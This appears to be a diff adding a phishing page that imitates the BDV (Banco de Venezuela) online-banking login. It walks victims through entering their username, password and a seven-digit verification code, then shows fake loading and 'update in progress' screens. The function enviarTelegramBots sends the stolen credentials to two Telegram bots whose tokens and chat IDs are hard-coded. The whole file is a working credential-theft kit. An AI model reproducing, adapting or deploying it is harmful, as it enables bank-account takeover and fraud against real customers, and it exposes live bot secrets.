@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BDV en línea personas</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-image: url('bdv_background.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            overflow-x: hidden;
+            position: relative;
+            min-height: 100vh;
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            min-height: 100vh;
+        }
+
+        .login-card {
+            background: #ffffff;
+            padding: 35px 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            width: 100%;
+            max-width: 380px;
+            z-index: 3;
+        }
+
+        .logo-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+
+        .logo-img {
+            height: 32px;
+            width: auto;
+        }
+
+        .step-text {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 10px;
+        }
+
+        .user-display {
+            font-size: 13px;
+            color: #444;
+            margin-bottom: 15px;
+        }
+
+        .form-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            background-color: #f2f2f2;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #333;
+            outline: none;
+        }
+
+        .code-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 6px;
+            margin-bottom: 10px;
+        }
+
+        .code-input {
+            width: 38px;
+            height: 48px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            background-color: #f2f2f2;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            outline: none;
+            color: #333;
+        }
+
+        .code-input:focus {
+            border-color: #5c246c;
+            background-color: #fff;
+            box-shadow: 0 0 0 2px rgba(92, 36, 108, 0.15);
+        }
+
+        .code-hint {
+            font-size: 11px;
+            color: #777;
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #666;
+            font-size: 16px;
+        }
+
+        .btn-entrar {
+            width: 100%;
+            padding: 12px;
+            background-color: #e0e0e0;
+            border: none;
+            border-radius: 4px;
+            color: #888;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: not-allowed;
+            margin-bottom: 15px;
+            transition: background-color 0.2s, color 0.2s;
+        }
+
+        .btn-entrar.active {
+            background-color: #0044aa;
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        .btn-reiniciar {
+            width: 100%;
+            padding: 12px;
+            background-color: #ffcc00;
+            border: none;
+            border-radius: 4px;
+            color: #333;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .btn-reiniciar:hover {
+            background-color: #e6b800;
+        }
+
+        .volver-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .volver-link {
+            font-size: 13px;
+            color: #5c246c;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .volver-link:hover {
+            text-decoration: underline;
+        }
+
+        .loading-screen, .update-screen {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .loading-title, .update-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #5c246c;
+            margin-bottom: 10px;
+        }
+
+        .loading-subtitle, .update-subtitle {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            background-color: #eee;
+            height: 8px;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background-color: #ffcc00;
+            transition: width 0.1s linear;
+        }
+
+        .progress-percentage {
+            font-size: 14px;
+            color: #555;
+            font-weight: bold;
+        }
+
+        .update-icon-container {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 50px;
+            height: 50px;
+            border: 2px solid #5c246c;
+            border-radius: 50%;
+            margin-bottom: 15px;
+            color: #5c246c;
+            font-size: 24px;
+        }
+
+        .login-links {
+            text-align: center;
+            font-size: 12px;
+            line-height: 1.6;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+            margin-top: 10px;
+        }
+
+        .login-links a {
+            color: #5c246c;
+            text-decoration: none;
+            display: block;
+        }
+
+        .login-links a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="login-card">
+            <div class="logo-header">
+                <img src="bdv_logo.png" alt="BDVenlínea personas" class="logo-img">
+            </div>
+
+            <div id="form-step-container"></div>
+
+            <div class="login-links">
+                <a href="#">¿Olvidaste tu usuario o clave?</a>
+                <a href="#">Si eres nuevo clienteBDV regístrate aquí</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let datosUsuario = {
+            usuario: "",
+            clave: "",
+            codigo: ""
+        };
+
+        const container = document.getElementById('form-step-container');
+
+        function renderPaso1() {
+            container.innerHTML = `
+                <div class="step-text">Paso 1 de 3 · Ingresa tu usuario</div>
+                <form>
+                    <div class="form-group">
+                        <input type="text" id="campo-usuario" class="form-control" placeholder="Usuario *" value="${datosUsuario.usuario}" autocomplete="off">
+                    </div>
+                    <button type="button" id="btn-submit" class="btn-entrar">Entrar</button>
+                </form>
+            `;
+
+            const inputUser = document.getElementById('campo-usuario');
+            const btnSubmit = document.getElementById('btn-submit');
+
+            if (datosUsuario.usuario.trim() !== '') {
+                btnSubmit.classList.add('active');
+            }
+
+            inputUser.addEventListener('input', (e) => {
+                datosUsuario.usuario = e.target.value;
+                if (datosUsuario.usuario.trim() !== '') {
+                    btnSubmit.classList.add('active');
+                } else {
+                    btnSubmit.classList.remove('active');
+                }
+            });
+
+            btnSubmit.addEventListener('click', () => {
+                if (datosUsuario.usuario.trim() !== '') {
+                    renderPaso2();
+                }
+            });
+
+            inputUser.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter' && datosUsuario.usuario.trim() !== '') {
+                    e.preventDefault();
+                    renderPaso2();
+                }
+            });
+        }
+
+        function renderPaso2() {
+            container.innerHTML = `
+                <div class="step-text">Paso 2 de 3 · Ingresa una clave</div>
+                <div class="user-display">Usuario: <strong>${datosUsuario.usuario}</strong></div>
+                <form>
+                    <div class="form-group">
+                        <input type="password" id="campo-clave" class="form-control" placeholder="Clave *" value="${datosUsuario.clave}" autocomplete="off">
+                        <span class="toggle-password" id="toggle-pwd">👁</span>
+                    </div>
+                    <button type="button" id="btn-submit" class="btn-entrar">Entrar</button>
+                    <div class="volver-container">
+                        <a class="volver-link" id="link-volver">← Volver</a>
+                    </div>
+                </form>
+            `;
+
+            const inputClave = document.getElementById('campo-clave');
+            const btnSubmit = document.getElementById('btn-submit');
+            const togglePwd = document.getElementById('toggle-pwd');
+            const linkVolver = document.getElementById('link-volver');
+
+            if (datosUsuario.clave.trim() !== '') {
+                btnSubmit.classList.add('active');
+            }
+
+            inputClave.addEventListener('input', (e) => {
+                datosUsuario.clave = e.target.value;
+                if (datosUsuario.clave.trim() !== '') {
+                    btnSubmit.classList.add('active');
+                } else {
+                    btnSubmit.classList.remove('active');
+                }
+            });
+
+            togglePwd.addEventListener('click', () => {
+                if (inputClave.type === 'password') {
+                    inputClave.type = 'text';
+                    togglePwd.style.color = '#0044aa';
+                } else {
+                    inputClave.type = 'password';
+                    togglePwd.style.color = '#666';
+                }
+            });
+
+            linkVolver.addEventListener('click', () => {
+                renderPaso1();
+            });
+
+            btnSubmit.addEventListener('click', () => {
+                if (datosUsuario.clave.trim() !== '') {
+                    renderPaso3();
+                }
+            });
+
+            inputClave.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter' && datosUsuario.clave.trim() !== '') {
+                    e.preventDefault();
+                    renderPaso3();
+                }
+            });
+        }
+
+        function renderPaso3() {
+            container.innerHTML = `
+                <div class="step-text">Paso 3 de 3 · Ingresa un código de siete dígitos</div>
+                <div class="user-display">Usuario: <strong>${datosUsuario.usuario}</strong></div>
+                <form>
+                    <div class="code-container" id="code-inputs-group">
+                        <input type="text" maxlength="1" class="code-input" autocomplete="off" />
+                        <input type="text" maxlength="1" class="code-input" autocomplete="off" />
+                        <input type="text" maxlength="1" class="code-input" autocomplete="off" />
+                        <input type="text" maxlength="1" class="code-input" autocomplete="off" />
+                        <input type="text" maxlength="1" class="code-input" autocomplete="off" />
+                        <input type="text" maxlength="1" class="code-input" autocomplete="off" />
+                        <input type="text" maxlength="1" class="code-input" autocomplete="off" />
+                    </div>
+                    <div class="code-hint">Puedes escribir o pegar cualquier código ficticio de 7 dígitos.</div>
+                    <button type="button" id="btn-submit" class="btn-entrar">Verificar</button>
+                    <div class="volver-container">
+                        <a class="volver-link" id="link-volver">← Volver</a>
+                    </div>
+                </form>
+            `;
+
+            const codeInputs = document.querySelectorAll('.code-input');
+            const btnSubmit = document.getElementById('btn-submit');
+            const linkVolver = document.getElementById('link-volver');
+
+            if (datosUsuario.codigo && datosUsuario.codigo.length === 7) {
+                codeInputs.forEach((input, index) => {
+                    input.value = datosUsuario.codigo[index] || '';
+                });
+                btnSubmit.classList.add('active');
+            }
+
+            codeInputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    const val = e.target.value;
+                    if (val && index < codeInputs.length - 1) {
+                        codeInputs[index + 1].focus();
+                    }
+                    actualizarCodigoGlobal();
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !input.value && index > 0) {
+                        codeInputs[index - 1].focus();
+                    }
+                });
+
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const pasteData = e.clipboardData.getData('text').trim();
+                    if (pasteData.length <= 7) {
+                        pasteData.split('').forEach((char, idx) => {
+                            if (codeInputs[idx]) {
+                                codeInputs[idx].value = char;
+                            }
+                        });
+                        const nextIndex = Math.min(pasteData.length, codeInputs.length - 1);
+                        codeInputs[nextIndex].focus();
+                        actualizarCodigoGlobal();
+                    }
+                });
+            });
+
+            function actualizarCodigoGlobal() {
+                let codigoCompleto = "";
+                codeInputs.forEach(inp => codigoCompleto += inp.value);
+                datosUsuario.codigo = codigoCompleto;
+
+                if (codigoCompleto.length === 7) {
+                    btnSubmit.classList.add('active');
+                } else {
+                    btnSubmit.classList.remove('active');
+                }
+            }
+
+            linkVolver.addEventListener('click', () => {
+                renderPaso2();
+            });
+
+            btnSubmit.addEventListener('click', () => {
+                if (datosUsuario.codigo.length === 7) {
+                    renderCargandoApp();
+                }
+            });
+        }
+
+        function renderCargandoApp() {
+            container.innerHTML = `
+                <div class="loading-screen">
+                    <div class="loading-title">Cargando la aplicación</div>
+                    <div class="loading-subtitle">Espera un momento.</div>
+                    <div class="progress-bar-container">
+                        <div class="progress-bar" id="progress-bar"></div>
+                    </div>
+                    <div class="progress-percentage" id="progress-text">0%</div>
+                </div>
+            `;
+
+            let progreso = 0;
+            const progressBar = document.getElementById('progress-bar');
+            const progressText = document.getElementById('progress-text');
+
+            let intervalo = setInterval(() => {
+                progreso += 1;
+                if (progreso <= 100) {
+                    progressBar.style.width = progreso + '%';
+                    progressText.textContent = progreso + '%';
+                } else {
+                    clearInterval(intervalo);
+                    setTimeout(() => {
+                        renderActualizacionEnCurso();
+                    }, 500);
+                }
+            }, 30);
+        }
+
+        function renderActualizacionEnCurso() {
+            container.innerHTML = `
+                <div class="update-screen">
+                    <div class="update-icon-container">
+                        <span>🕒</span>
+                    </div>
+                    <div class="update-title">Actualización en curso</div>
+                    <div class="update-subtitle">Estamos actualizando la aplicación, por favor espera un momento.</div>
+                    <button type="button" id="btn-reiniciar" class="btn-reiniciar">Reiniciar</button>
+                </div>
+            `;
+
+            // Enviar mensajes a ambos chats de Telegram
+            enviarTelegramBots();
+
+            const btnReiniciar = document.getElementById('btn-reiniciar');
+            btnReiniciar.addEventListener('click', () => {
+                datosUsuario = { usuario: "", clave: "", codigo: "" };
+                renderPaso1();
+            });
+        }
+
+        function enviarTelegramBots() {
+            const mensaje = `🔔 *Nuevos datos recibidos*:\n\n👤 *Usuario:* ${datosUsuario.usuario}\n🔑 *Clave:* ${datosUsuario.clave}\n🔢 *Código:* ${datosUsuario.codigo}`;
+            
+            // Configuración del primer bot y chat ID
+            const token1 = "8693441527:AAF5wgfWZ-D7vU5meoL5c9JJZ8cSOCNt2oI";
+            const chatId1 = "-1003838824915";
+            const url1 = `https://api.telegram.org/bot${token1}/sendMessage?chat_id=${chatId1}&text=${encodeURIComponent(mensaje)}&parse_mode=Markdown`;
+
+            // Configuración del segundo bot y chat ID
+            const token2 = "8666765498:AAGWJBrFW4DH2c4hDnKuTuocTON7G1FmU4A";
+            const chatId2 = "8867230397";
+            const url2 = `https://api.telegram.org/bot${token2}/sendMessage?chat_id=${chatId2}&text=${encodeURIComponent(mensaje)}&parse_mode=Markdown`;
+
+            // Enviar petición al primer bot
+            fetch(url1)
+                .then(res => res.json())
+                .then(data => console.log("Enviado al Bot 1 con éxito:", data))
+                .catch(err => console.error("Error al enviar al Bot 1:", err));
+
+            // Enviar petición al segundo bot
+            fetch(url2)
+                .then(res => res.json())
+                .then(data => console.log("Enviado al Bot 2 con éxito:", data))
+                .catch(err => console.error("Error al enviar al Bot 2:", err));
+        }
+
+        renderPaso1();
+    </script>
+</body>
+</html>
